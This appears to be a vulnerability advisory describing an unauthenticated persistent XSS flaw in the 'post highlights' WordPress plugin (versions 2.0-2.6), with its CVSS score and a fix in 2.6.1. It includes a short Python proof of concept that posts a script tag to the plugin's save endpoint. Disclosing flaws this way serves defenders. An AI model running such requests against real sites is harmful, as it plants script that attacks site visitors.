## post highlights 2.0 - 2.6, Persistent XSS

Due to a script having no access protection, and including the âwp-load.phpâ script, it is possible to update the âpost highlightsâ settings for any post. Using this flaw, you can enable âpost highlightsâ and insert arbitrary HTML content, which will then be output on the page. This output is not filtered or encoded, and as such allows any HTML content to be inserted, such as SCRIPT / IFRAME tags.

### Homepage

<https://wordpress.org/plugins/post-highlights/>

### CVSS Score

6.4

### CSSS Vector

(AV:N/AC:L/Au:N/C:P/I:P/A:N)

### Attack Scope

remote

### Authorization Required

None

### Mitigation

Update to version 2.6.1.

### Proof of Concept

The following Python script will enable âpost highlightsâ a post with the ID of â1â, and set the âheadlineâ field to an arbitrary piece of HTML, which results in a JavaScript alert being fired.

```
import requests

url = 'http://localhost/wp-content/plugins/post-highlights/ajax/ph_save.php'
payload = {
	"action":"highlight",
	"id":"1"
}
requests.post(url, data=payload)
payload = {
	"action":"headline",
	"id":"1",
	"txt":"<script>alert('.');</script>"
}
r = requests.post(url, data=payload)
```
